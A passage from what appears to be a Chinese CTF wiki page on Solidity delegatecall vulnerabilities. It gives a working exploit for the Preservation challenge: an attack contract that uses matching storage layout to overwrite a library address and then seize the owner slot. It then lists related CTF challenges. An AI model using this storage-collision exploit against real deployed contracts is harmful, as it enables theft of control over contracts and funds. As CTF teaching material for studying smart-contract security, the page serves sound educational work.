<li>这样，我们第一次调用 <code>setFirstTime</code> 将 timeZone1Library 变量修改为我们的恶意合约的地址，第二次调用 <code>setFirstTime</code> 就可以执行我们的任意代码了</li>
</ul>
<h3 id="exp">Exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
<pre class="highlight"><code class="language-solidity">pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c;
    Preservation target = Preservation(instance_address);
    function attack1() {
        target.setFirstTime(uint(address(this)));
    }
    function attack2() {
        target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2));
    }
    function setTime(uint _time) public {
        timeZone1Library = address(_time);
        timeZone2Library = address(_time);
        owner = address(_time);
    }
}</code></pre>
<p>先调用 <code>attack1()</code> ，再调用 <code>attack2()</code> 即可</p>
<h3 id="result">Result<a class="headerlink" href="#result" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../figure/result.png" /></p>
<h2 id="_9">题目<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
<h3 id="realworld-2018">RealWorld 2018<a class="headerlink" href="#realworld-2018" title="Permanent link">&para;</a></h3>
<ul>
<li>题目名称 Acoraida Monica</li>
</ul>
<h3 id="balsn-2019">Balsn 2019<a class="headerlink" href="#balsn-2019" title="Permanent link">&para;</a></h3>
<ul>
<li>题目名称 Creativity</li>
</ul>
<h3 id="2020">第五空间 2020<a class="headerlink" href="#2020" title="Permanent link">&para;</a></h3>
<ul>
<li>题目名称 SafeDelegatecall</li>
</ul>
<h3 id="2020_1">华为鲲鹏计算 2020<a class="headerlink" href="#2020_1" title="Permanent link">&para;</a></h3>
<ul>
<li>题目名称 boxgame</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>注：题目附件相关内容可至 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain">ctf-challenges/blockchain</a> 仓库寻找。</p>
</div></div>
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
                <p>Copyright &copy; 2020 - 2021 Conflux Wiki Team</p>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script>
            var base_url = "../../../..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../../../../js/base.js" defer></script>
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js" defer></script>
        <script src="../../../../static/js/extra.js" defer></script>
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
        <script src="../../../../search/main.js" defer></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
